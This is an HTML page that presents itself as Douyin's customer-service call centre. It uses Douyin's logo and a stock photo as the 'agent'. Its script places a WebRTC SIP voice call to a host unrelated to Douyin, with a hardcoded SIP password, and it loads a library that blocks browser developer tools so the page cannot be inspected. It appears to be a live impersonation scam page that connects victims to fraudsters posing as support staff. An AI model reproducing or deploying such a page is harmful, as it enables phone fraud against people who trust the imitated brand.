<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>抖音客服在线通话</title>
  <style>
    :root {
      --dy-black: #000;
      --dy-pink: #fe2c55;
      --dy-blue: #25f4ee;
      --dy-bg: #121212;
      --dy-light-gray: #f3f3f3;
      --dy-border-radius: 16px;
      --dy-font: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background-color: var(--dy-bg);
      font-family: var(--dy-font);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
    }
    .logo-box {
      margin-top: 36px;
      margin-bottom: 24px;
    }
    .logo-box img {
      height: 60px;
    }
    .main-content {
      background: #1f1f1f;
      padding: 32px 24px;
      border-radius: var(--dy-border-radius);
      box-shadow: 0 0 24px rgba(255, 255, 255, 0.05);
      text-align: center;
      width: 90vw;
      max-width: 400px;
    }
    .profile-avatar {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      margin-bottom: 20px;
      border: 3px solid var(--dy-blue);
    }
    h1 {
      font-size: 26px;
      margin-bottom: 20px;
      color: var(--dy-blue);
    }
    #callButton, #hangupButton {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      border: none;
      border-radius: 30px;
      margin: 10px 0;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.2s ease;
    }
    #callButton {
      background: linear-gradient(90deg, var(--dy-pink), #ff5b77);
      color: white;
    }
    #callButton:disabled {
      background: #ff8da5;
      cursor: not-allowed;
    }
    #hangupButton {
      background: linear-gradient(90deg, #555, #222);
      color: white;
    }
    #hangupButton:disabled {
      background: #888;
      cursor: not-allowed;
    }
    #callStatus {
      margin-top: 12px;
      font-size: 16px;
      color: #ccc;
    }
    .footer {
      font-size: 14px;
      color: #999;
      margin: 40px 20px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="logo-box">
    <img src="https://lf3-static.bytednsdoc.com/obj/eden-cn/lpqodtrgujjljpvj/douyin-logo.svg" alt="抖音 LOGO" />
  </div>
  <div class="main-content">
    <h1>抖音客服中心</h1>
    <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
    <div id="callStatus">未呼叫</div>
    <audio id="audioRemote" autoplay></audio>
  </div>
  <div class="footer">
    客服通话过程中请勿关闭页面或切换后台，以免中断对话。<br />
    服务时间：每日 9:00 - 21:00<br />
    © 2025 抖音客服 版权所有
  </div>

  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
      const configuration = {
        sockets: [socket],
        uri: 'sip:1002020@xin.anjre.cn',
        password: 'Aa6363463@',
        display_name: '抖音网页客户',
        session_timers: false,
        register: true
      };
      const ua = new JsSIP.UA(configuration);
      let session = null;
      let isCalling = false;

      ua.start();
      ua.on('registered', () => console.log('✅ 注册成功'));
      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));

      const callButton = document.getElementById('callButton');
      const hangupButton = document.getElementById('hangupButton');
      const statusDisplay = document.getElementById('callStatus');
      const remoteAudio = document.getElementById('audioRemote');

      function updateStatus(text) {
        statusDisplay.textContent = text;
      }

      window.makeCall = function () {
        if (isCalling) return;
        isCalling = true;
        callButton.disabled = true;
        hangupButton.disabled = false;
        updateStatus("正在呼叫客服...");

        session = ua.call('sip:999999@xin.anjre.cn', {
          mediaConstraints: { audio: true, video: false },
          rtcOfferConstraints: {
            offerToReceiveAudio: 1,
            offerToReceiveVideo: 0
          }
        });

        session.connection.addEventListener('addstream', function (e) {
          remoteAudio.srcObject = e.stream;
          remoteAudio.play().catch(err => console.warn('播放失败:', err));
        });

        session.on('progress', () => updateStatus("正在接通中..."));
        session.on('accepted', () => updateStatus("通话中"));
        session.on('ended', () => {
          updateStatus("通话结束");
          resetUI();
        });
        session.on('failed', (e) => {
          updateStatus("呼叫失败，请重试");
          console.error('呼叫失败:', e);
          resetUI();
        });
      };

      window.hangupCall = function () {
        if (session) session.terminate();
      };

      function resetUI() {
        isCalling = false;
        callButton.disabled = false;
        hangupButton.disabled = true;
        session = null;
      }
    });
  </script>
</body>
</html>
